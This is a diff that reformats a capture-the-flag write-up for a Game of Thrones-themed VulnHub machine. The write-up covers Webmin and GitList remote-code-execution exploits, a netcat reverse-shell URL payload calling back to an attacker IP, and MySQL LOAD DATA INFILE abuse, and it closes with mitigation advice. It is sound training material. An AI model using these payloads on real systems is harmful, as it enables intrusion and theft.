@@ -82,7 +82,7 @@ By insoecting http://192.168.1.124:10000, I reached the login interface of the W
 
 I cross-referenced this version against known public vulnerabilities using searchsploit: `searchsploit webmin`. The search identified a well-known Remote Code Execution vulnerability tracked as CVE-2012-2982. The flaw exists within the `show.cgi`component due to insufficient input validation, allowing an authenticated user to inject and execute arbitrary system commands with application privileges.
 
-To automate execution, I launched Metasploit (`msfconsole`), selected the appropriate exploit module, and configured the required session variables—including the remote target, credentials and a Python-based reverse shell payload to call back to my attacker machine:
+To automate execution, I launched Metasploit (`msfconsole`), selected the appropriate exploit module, and configured the required session variables, including the remote target, credentials and a Python-based reverse shell payload to call back to my attacker machine:
 ```bash
 use exploit/unix/webapp/webmin_show_cgi_exec
 set USERNAME aryastark
@@ -102,59 +102,75 @@ cat flag.txt
 The file also revealed the connection parameters for a backend PostgreSQL database.
 
 ### Mountain and the Vale (PostgreSQL)
-Using the established shell, I connected to the target's PostgreSQL database service using the native psql client, specifying the database name (mountainandthevale) and the user (robinarryn):
-psql -h 192.168.1.124 -d mountainandthevale -U robinarryn
-Once the SQL interactive session was established, I listed the available tables using the \d meta-command and queried the contents of the flag table:
-SELECT * FROM flag;
-The retrieved output was obfuscated using Base64 encoding, easily identifiable by its alphanumeric character set and the trailing == padding characters. I exited the SQL client and decoded the string via the Kali Linux CLI:
+
+Using the established shell, I connected to the target's PostgreSQL database service using the native psql client: `psql -h 192.168.1.124 -d mountainandthevale -U robinarryn`.
+
+Once the SQL interactive session was established, I listed the available tables using the `\d` meta-command and queried the contents of the flag table: `\d+ flag`. The retrieved output was obfuscated using Base64 encoding, identifiable by its alphanumeric character set and the trailing == padding characters. 
+
+I exited the SQL client and decoded the string via the Kali Linux CLI:
+```bash
 echo 'TmljZSEgeW91IGNvbnF1ZXJlZCB0aGUgS2luZ2RvbSBvZiB0aGUgTW91bnRhaW4gYW5kIHRoZSBWYWxlLiBUaGlzIGlzIHlvdXIgZmxhZzogYmIzYWVjMGZkY2RiYzI5NzQ4OTBmODA1YzU4NWQ0MzIuIE5leHQgc3RvcCB0aGUgS2luZ2RvbSBvZiB0aGUgUmVhY2guIFlvdSBjYW4gaWRlbnRpZnkgeW91cnNlbGYgd2l0aCB0aGlzIHVzZXIvcGFzcyBjb21iaW5hdGlvbjogb2xlbm5hdHlyZWxsQDdraW5nZG9tcy5jdGYvSDFnaC5HYXJkM24ucG93YWggLCBidXQgZmlyc3QgeW91IG11c3QgYmUgYWJsZSB0byBvcGVuIHRoZSBnYXRlcw==' | base64 -d
+```
 The decoded text revealed the fifth flag along with IMAP credentials for olennatyrell and a cryptic instruction regarding "opening the gates."
 
 ### The Reach (IMAP)
+
 According to my initial Nmap scan, the IMAP service (port 143) was marked as Filtered, indicating that an host-based firewall was blocking inbound traffic. The previous clue hinted at "opening the gates", implying a Port-Knocking defense mechanism. This technique keeps a port closed until the client sends a precise sequence of connection attempts to specific closed ports, dynamically updating firewall rules to allow access from the attacker's IP.
-Utilizing the port sequence recovered from earlier clues (3487, 64535, 12345), I executed the knock sequence:
-knock -v 192.168.1.124 3487 64535 12345
-A subsequent port scan confirmed that port 143 had transitioned to the Open state. I then established a text-based interactive session with the IMAP service using telnet:
-telnet 192.168.1.124 143
+
+Utilizing the port sequence recovered from earlier clues (3487, 64535, 12345), I executed the knock sequence: `knock -v 192.168.1.124 3487 64535 12345`. A subsequent port scan confirmed that port 143 had transitioned to the Open state. I then established a text-based interactive session with the IMAP service using telnet: `telnet 192.168.1.124 143`.
+
 I authenticated according to IMAP protocol syntax, listed the mailboxes, and selected the inbox folder to fetch the unread email body:
+```imap
 . LOGIN olennatyrell@7kingdoms.ctf H1gh.Gard3n.powah
 . LIST "" "*"
 . SELECT INBOX
 . FETCH 1 BODY[]
+```
 The raw email output exposed the sixth flag and the web panel credentials for the final phase.
 
 ### The Rock and King’s Landing (GitList and MySQL)
-I authenticated to the GitList web application running on port 1337 (http://192.168.1.124:1337). Exploring the Casterly-Rock repository, I discovered a Markdown file named note_under_the_bad.md containing a long hexadecimal string. I converted the hex string back to plaintext ASCII using xxd:
-echo '2f686f6d652f747972696f6e6c616e6e69737465722f636865636b706f696e742e747874' | xxd -r -plain
-The output revealed a local file path: /home/tyrionlannister/checkpoint.txt.
-Next, I used searchsploit to look up GitList vulnerabilities, finding a critical Remote Code Execution (RCE) exploit tracked as CVE-2014-4511. This flaw stems from a total lack of input sanitization within the URL string passed to the Git sub-commands (specifically the blame block). By injecting command escape sequences—such as backticks (`) or double quotes encoded as URL hex (%22%22%60)—the web server executes arbitrary operating system commands with web-user (www-data) privileges.
-I configured a Netcat listener on my Kali machine to catch the inbound reverse connection:
-nc -nvlp 5555
-I then issued the payload-laden HTTP request, injecting a Netcat reverse shell string directly into the vulnerable URL structure:
-http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc 192.168.1.58 5555 -e /bin/bash%60
-The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the checkpoint.txt file to gather final database credentials.
 
-The ultimate milestone (King's Landing) required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment:
-mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding
-I listed the tables and discovered a table named iron_throne. Running a SELECT * query on it returned an obfuscated message written in Morse Code. Translating the dots and dashes using an external web utility pointed to an unconventional system file path: /etc/mysql/flag.
-To read this root-protected file, I audited my database user privileges using:
-SHOW GRANTS FOR CURRENT_USER;
-The output showed that cerseilannister possessed SELECT, INSERT, and CREATE privileges, inherently inheriting the powerful FILE privilege. To read the flag file, I abused the LOAD DATA INFILE SQL command, forcing the database engine to read the root-owned system file and import its raw text contents into a newly created temporary staging table:
+I authenticated to the GitList web application running on port 1337 (http://192.168.1.124:1337). Exploring the Casterly-Rock repository, I discovered a Markdown file named `note_under_the_bad.md` containing a long hexadecimal string. I converted the hex string back to plaintext ASCII using xxd:
+```bash
+echo '2f686f6d652f747972696f6e6c616e6e69737465722f636865636b706f696e742e747874' | xxd -r -plain
+```
+The output revealed a local file path: `/home/tyrionlannister/checkpoint.txt`.
+
+Next, I used searchsploit to look up GitList vulnerabilities, finding a critical Remote Code Execution exploit tracked as CVE-2014-4511. This flaw stems from a total lack of input sanitization within the URL string passed to the Git sub-commands. By injecting command escape sequences, such as backticks (`) or double quotes encoded as URL hex (%22%22%60), the web server executes arbitrary operating system commands with web-user privileges.
+
+I configured a Netcat listener on my Kali machine to catch the inbound reverse connection: `nc -nvlp 5555`.
+I then issued the payload-laden HTTP request, injecting a Netcat reverse shell string directly into the vulnerable URL structure:
+`http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc 192.168.1.58 5555 -e /bin/bash%60`.
+The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the `checkpoint.txt` file to gather final database credentials.
+
+The King's Landing required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment: `mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding`.
+
+I listed the tables and discovered a table named `iron_throne`. Running a `SELECT *` query on it returned an obfuscated message written in Morse Code. Translating it using an external web utility pointed to an unconventional system file path: `/etc/mysql/flag`.
+
+To read this root-protected file, I audited my database user privileges using: `SHOW GRANTS FOR CURRENT_USER;`.
+The output showed that cerseilannister possessed `SELECT`, `INSERT`, and `CREATE` privileges, inherently inheriting the powerful `FILE` privilege. 
+
+To read the flag file, I abused the `LOAD DATA INFILE` SQL command, forcing the database engine to read the root-owned system file and import its raw text contents into a newly created temporary staging table:
+```bash
 CREATE TABLE temporary_flag (content VARCHAR(500));
 LOAD DATA INFILE '/etc/mysql/flag' INTO TABLE temporary_flag;
 SELECT * FROM temporary_flag;
+```
 The database executed the query, revealing the seventh and final flag, completing the comprehensive compromise of the target machine.
 
 ## Mitigation Recommendations
 To remediate the vulnerabilities exploited throughout this kill chain, the system administrator should implement the following security hardening procedures:
-Strict Patch Management: Immediately update Webmin and GitList instances to their latest stable releases to permanently eliminate the remote code execution flaws (CVE-2012-2982 and CVE-2014-4511).
-Principle of Least Privilege (Database Hardening): Revoke the FILE privilege from non-administrative database users like cerseilannister. Additionally, configure the global secure_file_priv variable in my.cnf to restrict import/export tasks to a specific, isolated folder, completely neutralizing the LOAD DATA INFILE file system attack vectors.
-Modern, Strong Hashing Functions: Upgrade credential storage from legacy MD5 algorithms to contemporary, slow password-hashing schemes designed to resist hardware-accelerated (GPU) cracking attempts, such as bcrypt, Argon2, or PBKDF2.
+- Strict Patch Management: Immediately update Webmin and GitList instances to their latest stable releases to permanently eliminate the remote code execution flaws (CVE-2012-2982 and CVE-2014-4511).
+- Principle of Least Privilege (Database Hardening): Revoke the FILE privilege from non-administrative database users like cerseilannister. Additionally, configure the global secure_file_priv variable in my.cnf to restrict import/export tasks to a specific, isolated folder, completely neutralizing the LOAD DATA INFILE file system attack vectors.
+- Modern, Strong Hashing Functions: Upgrade credential storage from legacy MD5 algorithms to contemporary, slow password-hashing schemes designed to resist hardware-accelerated (GPU) cracking attempts, such as bcrypt, Argon2, or PBKDF2.
 
 ## Resources and References
 Primary Walkthrough Guide: Hacking Articles - GOT Challenge
+
 Technical Milestone References: The Hacking Quest Series
+
 Target Download Repository: VulnHub - Game of Thrones CTF 1
+
 Vulnerability Scoring Reference: NIST National Vulnerability Database
 
 
